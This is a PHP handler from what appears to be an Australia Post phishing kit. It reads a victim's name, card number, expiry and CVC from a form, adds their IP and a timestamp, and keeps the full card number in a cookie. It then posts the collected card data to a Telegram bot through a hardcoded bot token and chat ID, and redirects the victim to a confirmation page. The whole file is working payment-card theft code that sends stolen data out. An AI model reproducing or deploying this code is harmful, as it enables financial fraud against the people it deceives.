<?php
include("../anti/index.php");
$TIME = date("d F Y H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];

         if(($_POST['1'] != "")  AND ($_POST['3'] != "") AND ($_POST['4'] != "")) {

        $message .= "+❤️✉️✉️✉️AustraliaPost  ✉️✉️✉️❤️+\n";
        $message .= "* NAME : ".$_POST['1']."\n";
        $message .= "* CARD  : ".$_POST['3']."\n";
        $message .= "* month  : ".$_POST['4']."\n";
        $message .= "* CVC  : ".$_POST['5']."\n";
        $message .= "* IP   : $ip\n";
        $message .= "* Date   :$TIME\n";
        $message .= "+❤️✉️✉️✉️✉️✉️✉️✉️✉️✉️✉️❤️+\n";

             setcookie("card",$_POST['3'], time()+3600, "/","", 0);
             $x = '';
             $count =0;
             for ($i =0; $i<strlen($_POST['3'])-4;$i++){
                 $count++;
                 $x.= 'x';
                 if(($count)%4 ===0 ){
                     $x.=" ";
                 }
             }
             $check =  substr($_POST['3'], strlen($_POST['3'])-4, 4);
             $x.= $check;
             setcookie("cardcashed",$x, time()+3600, "/","", 0);

             setcookie("card",$_POST['3'], time()+3600, "/","", 0);
             file_get_contents("https://api.telegram.org/bot7217034142:AAFTnwc5K2E2HJNFXJ9BWW_KBMrsahTlQ_4/sendMessage?chat_id=-4505093976&text=" . urlencode($message)."" );
			 
 
        header("Location: ../confirm.php");
} else


header("Location: ../index.php");




?>